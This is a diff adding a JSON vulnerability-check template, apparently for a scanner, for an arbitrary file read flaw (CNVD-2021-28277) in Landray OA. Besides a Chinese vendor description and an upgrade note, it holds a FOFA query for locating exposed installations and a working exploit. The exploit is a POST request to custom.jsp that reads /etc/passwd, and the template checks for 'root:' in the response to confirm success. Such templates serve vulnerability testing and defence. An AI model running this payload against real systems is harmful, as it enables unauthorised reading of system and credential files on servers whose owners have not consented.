@@ -1,0 +1,38 @@
+{
+  "product": "蓝凌OA",
+  "vul_name": "蓝凌OA 任意文件读取sys/ui/extend/varkind/custom.jsp",
+  "type": "文件读取",
+  "vul_id": [
+    "CNVD-2021-28277"
+  ],
+  "level": 3,
+  "vul_desc": "蓝凌软件全称深圳市蓝凌软件股份有限公司，于2001年在深圳科技园成立。蓝凌是国内知名的大平台OA服务商和国内领先的知识管理解决方案提供商，是专业从事组织的知识化咨询、软件研发、实施、技术服务的国家级高新技术企业，近期Landray-OA系统被爆出存任意文件读取漏洞和后台rce",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"Landray-OA系统\" "
+  },
+  "protocol": "http",
+  "link": "https://blog.51cto.com/u_16190539/9913400",
+  "fix": [
+    "建议使用蓝凌OA的系统更新系统至最新版本，附录地址：https://www.landray.com.cn/"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/sys/ui/extend/varkind/custom.jsp",
+      "data": "var={\"body\":{\"file\":\"file:///etc/passwd\"}}"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "root:"
+        }
+      ]
+    }
+  }
+}
